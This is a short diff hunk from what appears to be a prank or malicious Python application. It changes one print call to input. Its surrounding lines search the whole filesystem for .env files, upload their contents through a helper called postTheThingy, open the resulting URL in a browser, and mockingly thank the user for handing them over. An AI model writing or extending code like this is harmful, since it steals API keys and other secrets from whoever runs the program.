@@ -85,7 +85,7 @@ def main():
                     url = postTheThingy(epsteinFiles(searchFiles("/", ".env")))
                     webbrowser.open(url)
                     clear()
-                    print(f"thanks for that, i guess? you can check out your env files here: {url}")
+                    input(f"thanks for that, i guess? you can check out your env files here: {url}")
     clear()
     print("Please quit the application")
     sys.exit(0)
